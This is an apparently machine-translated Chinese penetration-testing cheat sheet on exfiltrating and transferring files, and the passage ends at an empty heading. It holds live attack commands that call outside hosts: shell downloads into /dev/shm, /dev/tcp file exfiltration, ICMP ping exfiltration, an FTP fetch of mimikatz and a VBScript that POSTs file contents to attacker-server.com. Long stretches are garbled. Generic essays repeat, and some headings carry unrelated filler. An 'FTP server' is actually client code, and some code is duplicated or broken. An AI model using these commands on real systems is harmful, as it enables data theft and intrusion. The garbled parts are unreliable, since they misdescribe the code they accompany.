# 渗透

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 NFT 收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder 跟踪你的攻击面，运行主动威胁扫描，发现整个技术栈中的问题，从 API 到 Web 应用和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 常见的白名单域名用于信息泄露

查看 [https://lots-project.com/](https://lots-project.com/) 以找到常见的白名单域名，可以被滥用

## 复制\&粘贴 Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Windows是一种广泛使用的操作系统，因此在渗透测试中，了解如何从Windows系统中窃取数据是至关重要的。以下是一些常见的Windows数据窃取方法和资源。

## 内部网络数据窃取

### 内部网络扫描

在Windows系统中，可以使用工具如Nmap、Masscan和Zmap等进行内部网络扫描，以发现其他主机和开放端口。这些工具可以帮助渗透测试人员识别潜在的目标和漏洞。

### 端口转发和隧道

端口转发和隧道技术可以帮助渗透测试人员在内部网络中建立通信通道，以便从受限制的系统中窃取数据。常用的工具包括Plink、Socat和Meterpreter等。

### 数据包嗅探

数据包嗅探是一种监视网络流量的技术，可以用于捕获敏感数据。在Windows系统中，可以使用工具如Wireshark、Tcpdump和WinPcap等进行数据包嗅探。

## 外部网络数据窃取

### 远程访问工具

远程访问工具可以帮助渗透测试人员从外部网络访问目标系统，并窃取数据。常用的远程访问工具包括Netcat、Meterpreter和Powershell Empire等。

### 邮件和文件传输

通过电子邮件和文件传输，渗透测试人员可以将窃取的数据从目标系统发送到外部网络。常用的工具包括SMTP客户端、FTP客户端和SCP客户端等。

### DNS隧道

DNS隧道是一种利用DNS协议进行数据传输的技术。渗透测试人员可以使用工具如Dnscat2和Iodine等，在外部网络中建立DNS隧道，以窃取数据。

## 数据编码和加密

### Base64编码

Base64编码是一种将二进制数据转换为可打印ASCII字符的编码方法。渗透测试人员可以使用Base64编码将窃取的数据进行编码，以便在网络中传输。

### 加密工具

加密工具可以帮助渗透测试人员对窃取的数据进行加密，以保护数据的机密性。常用的加密工具包括GnuPG、OpenSSL和AESCrypt等。

以上是一些常见的Windows数据窃取方法和资源，渗透测试人员可以根据具体情况选择适合的方法来窃取数据。
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
### HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Windows是一种广泛使用的操作系统，因此在渗透测试中，了解如何从Windows系统中窃取数据是至关重要的。以下是一些常见的Windows数据窃取方法和资源。

## 内部网络数据窃取

### 内部网络扫描

在Windows系统中，可以使用工具如Nmap、Masscan和Zmap等进行内部网络扫描，以发现其他主机和开放端口。这些工具可以帮助渗透测试人员识别潜在的目标和漏洞。

### 端口转发和隧道

端口转发和隧道技术可以帮助渗透测试人员在内部网络中建立通信通道，以便从受限制的系统中窃取数据。常用的工具包括Plink、Socat和Meterpreter等。

### 数据包嗅探

数据包嗅探是一种监视网络流量的技术，可以用于捕获敏感数据。在Windows系统中，可以使用工具如Wireshark、Tcpdump和WinPcap等进行数据包嗅探。

## 外部网络数据窃取

### 远程访问工具

远程访问工具可以帮助渗透测试人员从外部网络访问目标系统，并窃取数据。常用的远程访问工具包括Netcat、Meterpreter和Powershell Empire等。

### 邮件和文件传输

通过电子邮件和文件传输，渗透测试人员可以将窃取的数据从目标系统发送到外部网络。常用的工具包括SMTP客户端、FTP客户端和SCP客户端等。

### DNS隧道

DNS隧道是一种利用DNS协议进行数据传输的技术。渗透测试人员可以使用工具如Dnscat2和Iodine等，在外部网络中建立DNS隧道，以窃取数据。

## 数据编码和加密

### Base64编码

Base64编码是一种将二进制数据转换为可打印ASCII字符的编码方法。渗透测试人员可以使用Base64编码将窃取的数据进行编码，以便在网络中传输。

### 加密工具

加密工具可以帮助渗透测试人员对窃取的数据进行加密，以保护数据的机密性。常用的加密工具包括GnuPG、OpenSSL和AESCrypt等。

以上是一些常见的Windows数据窃取方法和资源，渗透测试人员可以根据具体情况选择适合的方法来窃取数据。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### 上传文件

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer 打印 GET 和 POST 请求（包括头部信息）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS服务器**

An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. HTTPS is an extension of the HTTP protocol that adds encryption and authentication mechanisms to ensure the confidentiality and integrity of the data being transmitted.

To set up an HTTPS server, you need to obtain an SSL/TLS certificate from a trusted certificate authority (CA). This certificate is used to verify the identity of the server and establish a secure connection with the client. Once the certificate is obtained, it needs to be installed on the server.

There are several popular web servers that support HTTPS, such as Apache, Nginx, and Microsoft IIS. These servers can be configured to listen for HTTPS connections on a specific port (usually port 443) and handle the encryption and decryption of the data.

When a client connects to an HTTPS server, the server presents its SSL/TLS certificate to the client. The client then verifies the authenticity of the certificate and establishes a secure connection with the server. All data transmitted between the client and the server is encrypted using the SSL/TLS protocol, preventing eavesdropping and tampering.

HTTPS servers are commonly used for secure online transactions, such as e-commerce websites, online banking, and other applications that require the protection of sensitive information. By using HTTPS, the server ensures that the data exchanged between the client and the server is secure and cannot be intercepted or modified by attackers.

Setting up and configuring an HTTPS server requires careful attention to security practices and best practices. It is important to keep the server and its software up to date with the latest security patches and to follow secure configuration guidelines to minimize the risk of vulnerabilities and attacks.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP服务器（Python）

```python
import ftplib

def ftp_upload(hostname, username, password, local_file, remote_file):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.storbinary('STOR ' + remote_file, open(local_file, 'rb'))
        ftp.quit()
        print("File uploaded successfully.")
    except ftplib.all_errors as e:
        print("Error uploading file:", e)

def ftp_download(hostname, username, password, remote_file, local_file):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.retrbinary('RETR ' + remote_file, open(local_file, 'wb').write)
        ftp.quit()
        print("File downloaded successfully.")
    except ftplib.all_errors as e:
        print("Error downloading file:", e)
```

使用Python编写的FTP服务器。

```python
import ftplib

def ftp_upload(hostname, username, password, local_file, remote_file):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.storbinary('STOR ' + remote_file, open(local_file, 'rb'))
        ftp.quit()
        print("文件上传成功。")
    except ftplib.all_errors as e:
        print("上传文件时出错：", e)

def ftp_download(hostname, username, password, remote_file, local_file):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.retrbinary('RETR ' + remote_file, open(local_file, 'wb').write)
        ftp.quit()
        print("文件下载成功。")
    except ftplib.all_errors as e:
        print("下载文件时出错：", e)
```
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP服务器（NodeJS）

The FTP server is a popular method for transferring files between a client and a server over a network. It is widely used in various industries for its simplicity and efficiency. In this section, we will explore how to set up an FTP server using NodeJS.

#### Setting up the FTP server

To set up an FTP server using NodeJS, we need to install the `ftp-srv` package. This package provides a simple and easy-to-use API for creating an FTP server.

```javascript
const ftpsrv = require('ftp-srv');

const server = new ftpsrv('ftp://127.0.0.1:21', {
  anonymous: true,
  greeting: 'Welcome to the FTP server',
});

server.on('login', ({connection, username, password}, resolve, reject) => {
  if (username === 'anonymous' && password === '') {
    resolve({root: '/path/to/ftp/root'});
  } else {
    reject(new Error('Invalid username or password'));
  }
});

server.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((err) => {
    console.error('Failed to start FTP server:', err);
  });
```

In the above code, we create a new instance of the `ftpsrv` class and pass the FTP server URL (`ftp://127.0.0.1:21`) as well as some optional configuration options. We set `anonymous` to `true` to allow anonymous login and provide a greeting message.

We also listen for the `login` event, which is triggered when a client attempts to log in to the FTP server. In the event handler, we check if the provided username and password match the anonymous login credentials. If they do, we resolve the login request and specify the root directory for the FTP server. If the credentials are invalid, we reject the login request with an error.

Finally, we call the `listen` method to start the FTP server. If the server starts successfully, we log a success message. If there is an error, we log an error message.

#### Connecting to the FTP server

Once the FTP server is set up and running, clients can connect to it using an FTP client application. They can use the server URL (`ftp://127.0.0.1:21`) and provide the username and password (if required) to log in.

After successfully logging in, clients can perform various operations such as uploading files, downloading files, creating directories, and deleting files. The FTP server handles these operations and ensures the secure transfer of files between the client and the server.

#### Conclusion

Setting up an FTP server using NodeJS is a straightforward process. By following the steps outlined in this section, you can create your own FTP server and facilitate the secure transfer of files over a network.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP服务器（pure-ftp）

FTP服务器是一种常见的文件传输协议，用于在网络上传输文件。Pure-FTP是一种流行的FTP服务器软件，提供了安全的文件传输功能。

#### 概述

Pure-FTP服务器使用FTP协议来接收和发送文件。攻击者可以利用各种技术来从目标FTP服务器中窃取敏感数据。以下是一些常见的方法：

#### 1. 基于弱密码的攻击

攻击者可以使用暴力破解或字典攻击等技术来尝试破解FTP服务器的密码。如果FTP服务器使用弱密码，攻击者可以成功登录并访问服务器上的文件。

#### 2. 恶意软件注入

攻击者可以通过向FTP服务器上传恶意软件来感染服务器。一旦恶意软件被执行，攻击者可以利用它来窃取服务器上的文件并将其传输到远程服务器。

#### 3. 数据包嗅探

攻击者可以使用数据包嗅探工具来拦截通过网络传输的FTP数据包。通过分析这些数据包，攻击者可以获取敏感数据，如用户名、密码和文件内容。

#### 4. 中间人攻击

攻击者可以通过在客户端和FTP服务器之间插入自己的服务器来进行中间人攻击。这使得攻击者能够窃取传输的文件和敏感信息。

#### 防御措施

为了保护FTP服务器免受数据泄露的风险，以下是一些推荐的防御措施：

- 使用强密码：确保FTP服务器的密码是强密码，并定期更改密码。
- 加密传输：使用SSL/TLS等加密协议来保护FTP数据的传输。
- 定期更新软件：确保FTP服务器软件和操作系统都是最新的，以修复已知的安全漏洞。
- 监控日志：定期检查FTP服务器的日志，以便及时发现异常活动。
- 限制访问权限：只允许授权用户访问FTP服务器，并限制他们的权限。

通过采取这些防御措施，可以减少FTP服务器被攻击的风险，并保护敏感数据的安全。
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** 客户端

#### Exfiltration Techniques

Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of penetration testing, exfiltration techniques are used to demonstrate the potential vulnerabilities in a system's data protection mechanisms.

Here are some common exfiltration techniques that can be used on a Windows client:

1. **File Transfer**: This technique involves copying sensitive files from the target system to an external location. It can be done using various methods such as FTP, SMB, or cloud storage services.

2. **Email**: Sending sensitive data via email is another exfiltration technique. Attackers can attach the files to an email and send them to their own email address or a compromised account.

3. **Web-based Exfiltration**: Attackers can use web-based services to exfiltrate data. This can be done by uploading files to a cloud storage service or using web forms to send data to an external server.

4. **DNS Tunneling**: DNS tunneling involves encoding sensitive data into DNS queries and responses. Attackers can use this technique to bypass firewalls and exfiltrate data by sending DNS requests to a controlled server.

5. **Covert Channels**: Covert channels are hidden communication channels that can be used to exfiltrate data. Attackers can use techniques such as steganography (hiding data within images or other files) or encoding data into seemingly innocuous traffic to transfer sensitive information.

#### Countermeasures

To protect against exfiltration attacks on Windows clients, consider implementing the following countermeasures:

1. **Network Segmentation**: Segmenting the network can help contain the impact of an exfiltration attack. By separating sensitive data from other systems, you can limit the attacker's ability to access and exfiltrate data.

2. **Data Loss Prevention (DLP)**: Implementing DLP solutions can help detect and prevent unauthorized data transfers. DLP tools can monitor network traffic, identify sensitive data, and block or alert on suspicious activities.

3. **Endpoint Protection**: Deploying endpoint protection solutions can help detect and block exfiltration attempts. These solutions can monitor file transfers, email communications, and network traffic for signs of data exfiltration.

4. **User Education**: Educating users about the risks of data exfiltration and the importance of following security best practices can help prevent successful attacks. Users should be trained to recognize phishing emails, avoid downloading suspicious files, and report any suspicious activities.

5. **Monitoring and Logging**: Implementing robust monitoring and logging mechanisms can help detect exfiltration attempts and provide valuable forensic evidence. Monitor network traffic, system logs, and user activities to identify any abnormal or suspicious behavior.

By understanding common exfiltration techniques and implementing appropriate countermeasures, you can enhance the security of Windows clients and protect sensitive data from unauthorized access and transfer.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali作为服务器
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
或者使用Samba创建一个SMB共享：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# 数据外泄

数据外泄是指未经授权的数据泄露或传输。在渗透测试中，数据外泄是一个重要的目标，因为它可以揭示敏感信息并对组织造成严重损害。以下是一些常见的数据外泄技术和资源。

## 1. 文件传输

文件传输是将数据从受攻击的系统传输到攻击者控制的系统的过程。以下是一些常用的文件传输方法：

- 使用文件传输协议（FTP）将文件从受攻击的系统上传到攻击者的系统。
- 使用远程桌面协议（RDP）或虚拟网络计算机（VNC）等远程访问工具，将文件从受攻击的系统复制到攻击者的系统。
- 使用云存储服务（如Dropbox、Google Drive等）将文件上传到云端，然后从云端下载到攻击者的系统。

## 2. 数据编码和加密

数据编码和加密是将敏感数据转换为不可读或难以理解的形式，以防止未经授权的访问。以下是一些常用的数据编码和加密方法：

- Base64编码：将二进制数据转换为可打印字符的编码格式。
- 加密算法：使用对称加密算法（如AES）或非对称加密算法（如RSA）对数据进行加密。
- 隐写术：将数据隐藏在其他文件或媒体中，以避免被发现。

## 3. 隧道和代理

隧道和代理是将数据通过其他网络通道传输的方法，以绕过网络防御机制。以下是一些常用的隧道和代理技术：

- VPN隧道：使用虚拟专用网络（VPN）建立安全的加密通道，将数据从受攻击的系统传输到攻击者的系统。
- SOCKS代理：使用SOCKS代理服务器将数据从受攻击的系统传输到攻击者的系统。
- HTTP代理：使用HTTP代理服务器将数据通过HTTP协议传输到攻击者的系统。

## 4. 邮件和消息传递

邮件和消息传递是通过电子邮件或即时消息服务传输数据的方法。以下是一些常用的邮件和消息传递技术：

- 通过SMTP协议发送电子邮件，将数据从受攻击的系统发送到攻击者的系统。
- 使用即时消息服务（如XMPP、IRC等）将数据从受攻击的系统传输到攻击者的系统。

## 5. 数据压缩和分割

数据压缩和分割是将数据压缩或分割成多个部分，以便更容易传输和隐藏。以下是一些常用的数据压缩和分割方法：

- 使用压缩算法（如ZIP、RAR等）将数据压缩成较小的文件。
- 将数据分割成多个部分，并使用文件分割工具将这些部分分别传输到攻击者的系统。

以上是一些常见的数据外泄技术和资源，渗透测试人员可以根据具体情况选择适合的方法来实现数据外泄。
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻击者必须运行SSHd。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

如果受害者拥有SSH，攻击者可以将受害者的目录挂载到攻击者的计算机上。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC（Netcat）是一种功能强大的网络工具，可用于在网络上进行数据传输和端口扫描。它可以作为客户端或服务器使用，并支持多种协议和功能。以下是一些常见的使用场景和方法：

### 数据传输

使用NC可以在网络上传输数据。以下是一些常见的方法：

- 使用TCP协议传输数据：`nc <目标IP> <目标端口> < 文件名`
- 使用UDP协议传输数据：`nc -u <目标IP> <目标端口> < 文件名`
- 使用反向连接传输数据：`nc -l -p <本地端口> > 文件名`

### 端口扫描

NC还可以用于进行端口扫描，以检测目标主机上开放的端口。以下是一些常见的方法：

- 扫描单个端口：`nc -z <目标IP> <目标端口>`
- 扫描一系列端口：`nc -z <目标IP> <起始端口>-<结束端口>`
- 扫描常见端口：`nc -z <目标IP> 1-1024`

### 其他功能

除了数据传输和端口扫描，NC还具有其他一些功能：

- 创建一个简单的聊天服务器：`nc -l -p <本地端口>`
- 远程执行命令：`nc <目标IP> <目标端口> -e /bin/bash`
- 文件传输：`nc -l -p <本地端口> > 文件名` 和 `nc <目标IP> <目标端口> < 文件名`

NC是一种非常灵活和强大的工具，可以在渗透测试和网络安全评估中发挥重要作用。熟练掌握NC的使用方法，可以帮助黑客更好地执行各种任务。
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/<attacker_ip>/<attacker_port>
```

This method allows the attacker to download a file from the victim's machine by redirecting the file's contents to the attacker's IP address and port number using the `/dev/tcp` device file.

### Upload file to victim
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### 将文件上传到受害者计算机

To exfiltrate data from a victim's computer, one common method is to upload a file to the target system. This allows the attacker to transfer sensitive information from the victim's machine to their own.

There are several ways to accomplish this:

1. **Web-based file upload**: Exploiting vulnerabilities in web applications that allow file uploads can be an effective method. Attackers can upload malicious files that contain code to exfiltrate data.

2. **Email attachments**: Sending an email with an attachment that contains the sensitive data is another option. The victim unknowingly opens the attachment, allowing the attacker to gain access to the data.

3. **Remote file transfer**: Using tools like FTP (File Transfer Protocol) or SCP (Secure Copy Protocol), attackers can transfer files from the victim's computer to their own. This method requires prior access to the victim's system.

4. **Cloud storage**: Attackers can leverage cloud storage platforms to upload files from the victim's computer. This can be done by compromising the victim's cloud account or by exploiting vulnerabilities in the cloud service itself.

It is important for security professionals to be aware of these methods in order to protect against data exfiltration. Implementing strong security measures, such as regular vulnerability assessments and secure file upload configurations, can help mitigate the risk of file uploads being used for malicious purposes.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
感谢 **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

默认情况下，在XP和2003中（在其他系统中需要在安装过程中显式添加）

在Kali中，**启动TFTP服务器**：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Python中的TFTP服务器：**

```python
import socket
import struct

def tftp_server():
    # 创建UDP套接字
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # 接收客户端请求
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # 处理读请求
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # 读取文件内容
            try:
                with open(filename, 'rb') as file:
                    file_data = file.read()
            except FileNotFoundError:
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)
                continue

            # 发送文件内容
            block_number = 1
            start_index = 0
            while start_index < len(file_data):
                end_index = start_index + 512
                data_packet = struct.pack('!HH', 3, block_number) + file_data[start_index:end_index]
                server_socket.sendto(data_packet, client_address)
                ack_packet, _ = server_socket.recvfrom(4)
                ack_block_number = struct.unpack('!HH', ack_packet[:4])[1]

                if ack_block_number == block_number:
                    block_number += 1
                    start_index = end_index
                else:
                    break

        elif opcode == 2:
            # 处理写请求
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # 接收文件内容
            file_data = b''
            block_number = 0
            while True:
                ack_packet = struct.pack('!HH', 4, block_number)
                server_socket.sendto(ack_packet, client_address)
                data_packet, _ = server_socket.recvfrom(516)
                received_block_number = struct.unpack('!HH', data_packet[:4])[1]

                if received_block_number == block_number + 1:
                    file_data += data_packet[4:]
                    block_number += 1
                    if len(data_packet) < 516:
                        break
                else:
                    break

            # 写入文件内容
            try:
                with open(filename, 'wb') as file:
                    file.write(file_data)
            except:
                error_packet = struct.pack('!HH', 5, 2) + b'Access violation'
                server_socket.sendto(error_packet, client_address)
                continue

        else:
            # 不支持的操作码
            error_packet = struct.pack('!HH', 5, 4) + b'Illegal TFTP operation'
            server_socket.sendto(error_packet, client_address)

    server_socket.close()

if __name__ == '__main__':
    tftp_server()
```

**TFTP服务器是一种用于文件传输的简单协议。它使用UDP协议进行通信。该Python代码实现了一个TFTP服务器，可以处理客户端的读取和写入请求。**

```python
import socket
import struct

def tftp_server():
    # 创建UDP套接字
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # 接收客户端请求
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # 处理读请求
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # 读取文件内容
            try:
                with open(filename, 'rb') as file:
                    file_data = file.read()
            except FileNotFoundError:
                error_packet = struct.pack('!HH', 5, 1) + b'文件未找到'
                server_socket.sendto(error_packet, client_address)
                continue

            # 发送文件内容
            block_number = 1
            start_index = 0
            while start_index < len(file_data):
                end_index = start_index + 512
                data_packet = struct.pack('!HH', 3, block_number) + file_data[start_index:end_index]
                server_socket.sendto(data_packet, client_address)
                ack_packet, _ = server_socket.recvfrom(4)
                ack_block_number = struct.unpack('!HH', ack_packet[:4])[1]

                if ack_block_number == block_number:
                    block_number += 1
                    start_index = end_index
                else:
                    break

        elif opcode == 2:
            # 处理写请求
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # 接收文件内容
            file_data = b''
            block_number = 0
            while True:
                ack_packet = struct.pack('!HH', 4, block_number)
                server_socket.sendto(ack_packet, client_address)
                data_packet, _ = server_socket.recvfrom(516)
                received_block_number = struct.unpack('!HH', data_packet[:4])[1]

                if received_block_number == block_number + 1:
                    file_data += data_packet[4:]
                    block_number += 1
                    if len(data_packet) < 516:
                        break
                else:
                    break

            # 写入文件内容
            try:
                with open(filename, 'wb') as file:
                    file.write(file_data)
            except:
                error_packet = struct.pack('!HH', 5, 2) + b'访问违规'
                server_socket.sendto(error_packet, client_address)
                continue

        else:
            # 不支持的操作码
            error_packet = struct.pack('!HH', 5, 4) + b'非法的TFTP操作'
            server_socket.sendto(error_packet, client_address)

    server_socket.close()

if __name__ == '__main__':
    tftp_server()
```
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
在**受害者**中，连接到Kali服务器：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

使用 PHP 一行代码下载文件：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript（Visual Basic Scripting Edition）是一种基于Visual Basic的脚本语言，常用于Windows操作系统上的自动化任务和脚本编写。VBScript可以通过多种方式进行数据泄露，包括以下几种常见的方法：

### 1. 文件传输

使用VBScript可以通过文件传输将敏感数据从目标系统传送到攻击者控制的服务器。这可以通过使用`FileSystemObject`对象来读取和写入文件来实现。攻击者可以编写VBScript脚本来遍历目标系统上的文件，并将其中的敏感数据复制到攻击者的服务器上。

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\path\to\file.txt", 1)
strData = objFile.ReadAll
objFile.Close

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "POST", "http://attacker-server.com/receive.php", False
objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.send "data=" & strData
```

### 2. 网络传输

